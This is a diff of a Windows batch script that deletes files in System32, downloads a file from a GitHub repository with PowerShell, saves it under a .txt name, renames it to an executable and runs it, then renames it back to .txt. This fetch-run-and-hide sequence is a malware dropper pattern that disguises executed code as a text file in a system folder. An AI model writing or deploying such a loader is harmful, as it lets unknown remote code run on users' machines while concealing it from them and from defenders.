@@ -12,18 +12,18 @@ if %errorlevel% neq 0 (
 )
 
 :: Step 1: Delete old files
-if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\M82BSq"
+if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\M82BS.txt"
 if exist "C:\Windows\System32\tttt2.exe" del /f /q "C:\Windows\System32\tttt2.exe"
 
 :: Step 2: Download new file
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/M82BSq' -OutFile 'C:\Windows\System32\M82BSq.txt' -ErrorAction Stop } catch { exit 1 }"
-if not exist "C:\Windows\System32\M82BSq.txt" (
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/M82BS' -OutFile 'C:\Windows\System32\M82BS.txt' -ErrorAction Stop } catch { exit 1 }"
+if not exist "C:\Windows\System32\M82BS.txt" (
     echo [ERROR] Download failed!
     exit /b
 )
 
 :: Step 3: Rename DLL to EXE
-ren "C:\Windows\System32\M82BSq.txt" "tttt2.exe"
+ren "C:\Windows\System32\M82BS.txt" "tttt2.exe"
 
 :: Step 4: Execute
 start "" "C:\Windows\System32\tttt2.exe"
@@ -32,7 +32,7 @@ start "" "C:\Windows\System32\tttt2.exe"
 timeout /t 5 /nobreak >nul
 
 :: Step 6: Rename EXE back to DLL
-ren "C:\Windows\System32\tttt2.exe" "M82BSq.txt"
+ren "C:\Windows\System32\tttt2.exe" "M82BS.txt"
 
 :: Auto-exit
 exit
